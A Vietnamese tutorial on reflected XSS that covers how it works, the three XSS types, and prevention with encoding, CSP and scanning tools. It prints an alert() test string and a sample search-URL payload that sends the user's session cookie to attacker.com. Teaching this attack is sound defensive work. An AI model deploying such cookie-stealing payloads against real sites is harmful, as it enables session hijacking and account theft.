Non-persistent XSS, còn được gọi là reflected XSS, là loại lỗ hổng cơ bản nhất. Một ứng dụng web sẽ hiển thị thông tin đầu vào chưa xác thực được nhận từ trình duyệt của người dùng và thực thi bất kỳ mã JavaScript nào mà nó được nhập. Hãy xem tại sao có thể có lỗ hổng XSS này và chúng ta có thể làm gì để ngăn chặn.

![](https://images.viblo.asia/901d5a39-4140-4571-b69e-e60995429774.jpg)

### Cross-Site Scripting: Các kiểu tấn công XSS:
<br/>Các lỗ hổng Cross-site scripting có thể được chia thành 3 loại lớn:
* Non-persistent (reflected) XSS: JavaScript độc hại được gửi trong Client Request được lặp lại trong mã HTML được gửi bởi server và được thực thi trên trình duyệt của người dùng.
* Persistent (stored) XSS: JavaScript độc hại được lưu trữ trong server-side (ví dụ: trong một comment database) và được thực thi mỗi khi trình duyệt của người dùng tải nó.
* DOM-based (client-side) XSS: Một cuộc tấn công gián tiếp trong đó Server’s HTTP response không bao gồm tập lệnh độc hại thực sự. Thay vào đó, trình duyệt được chèn mã độc vào cấu trúc DOM của nó và chỉ khi đó JavaScript mới được thực thi.

### Cách hoạt động của Non-Persistent XSS:
<br/>Lấy một ví dụ thông thường, hãy tưởng tượng bạn có một công cụ tìm kiếm trên trang web của mình. Người dùng nhập chuỗi tìm kiếm, chẳng hạn như reflected XSS và máy chủ web trả về một trang có tiêu đề Bạn đã tìm kiếm reflected XSS, theo sau là kết quả tìm kiếm. Thông thường, chuỗi tìm kiếm được đưa trực tiếp vào URL dưới dạng query parameter, điều này làm cho kiểu tấn công này dễ dàng hơn nhiều. Các trang lỗi là một nơi khác mà thông tin đầu vào của người dùng thường được phản hồi trực tiếp.

Nếu máy chủ không mã hóa đúng đầu vào của người dùng, kẻ tấn công có thể tìm kiếm một chuỗi chẳng hạn như "<script> alert ('Dễ bị tấn công với XSS!') </script>". JavaScript này sẽ được gửi lại (reflected) đến trình duyệt như một phần của code trang web và được thực thi để hiển thị alert xác nhận sự tồn tại của lỗ hổng bảo mật . Những kẻ tấn công có thể đưa JavaScript tùy ý để chuyển hướng người dùng đến một trang web độc hại, đánh cắp session cookies, lấy cắp thông tin cá nhân và thực hiện nhiều cuộc tấn công khác.

Dưới đây là payload tấn công thực tế hơn:

```
http://www.example.com/search.php?q= <script> document.location = 'https: //attacker.com/? cookie =' + encodeURIComponent (document.cookie) </script>
```
Nếu chức năng tìm kiếm điều hướng kết quả search đến trang kết quả tìm kiếm, nó sẽ thực thi tập lệnh được chèn vào và sẽ chuyển hướng đến attacker.com đồng thời gửi giá trị cookie hiện tại của người dùng cho kẻ tấn công.

Loại tấn công cross-site scripting này yêu cầu người dùng gửi một HTTP request chứa payload tấn công, vì vậy các liên kết độc hại là vectơ chính cho các cuộc tấn công reflected XSS. Chúng có thể được phát tán qua e-mail hoặc trên phương tiện truyền thông xã hội, hoặc chỉ đơn giản là xuất bản trên một trang web dưới một cái tên hấp dẫn với hy vọng rằng người dùng sẽ nhấp vào chúng. Những kẻ tấn công thường sử dụng các dịch vụ rút ngắn URL để ẩn nội dung liên kết. Do đó, người dùng có thể bị lừa truy cập vào các URL độc hại.

### Ngăn chặn các cuộc tấn công Reflected XSS:
Cross-site scripting là một trong những loại lỗ hổng cơ bản trong bảo mật ứng dụng web, vì vậy có rất nhiều công cụ và tài nguyên giúp bạn bảo vệ chống lại nó. Giống như các cuộc tấn công injection khác, xác thực đầu vào cẩn thận và mã hóa theo ngữ cảnh cung cấp. Phần "dữ liệu nhạy cảm" là nơi có những rủi ro thực sự, vì các dữ liệu được mã hoá tùy thuộc vào vị trí trong mã nguồn mà bạn đang chèn dữ liệu đầu vào. Để tìm hiểu kỹ hơn, các bạn hãy tham khảo thêm OWASP Cross-Site Scripting Prevention Cheat Sheet and OWASP guide to Testing for Reflected Cross-Site Scripting.

Lọc dữ liệu đầu vào bằng cách đưa vào danh sách đen các chuỗi và ký tự nhất định không phải là cách bảo vệ hiệu quả và không được khuyến khích. Đây là lý do tại sao bộ lọc XSS không còn được sử dụng trong các trình duyệt hiện nay. Để bảo vệ, chống lại cross-site scripting và nhiều cuộc tấn công khác, Content-Security Policy (CSP) được định cấu hình cẩn thận là cách tiếp cận được khuyến khích.

Phần lớn các cross-site scripting, bao gồm cả non-persistent XSS, có thể được phát hiện bằng giải pháp kiểm tra lỗ hổng bảo mật hiện đại. Hiện nay có rất nhiều các công cụ mất phí và miễn phí giúp tìm thấy nhiều loại XSS, từ XSS phản ánh cơ bản đến các cuộc tấn công phức tạp hơn như dựa trên DOM và blind XSS, đồng thời cung cấp các đề xuất chi tiết về các biện pháp khắc phục phù hợp. 
Các công cụ miễn phí: Vega, App Trana, Burp Suite,.. Các công cụ trả phí: Netsparker, Cloud Security,...



Nguồn tham khảo: https://www.netsparker.com/blog/web-security/reflected-xss-attack/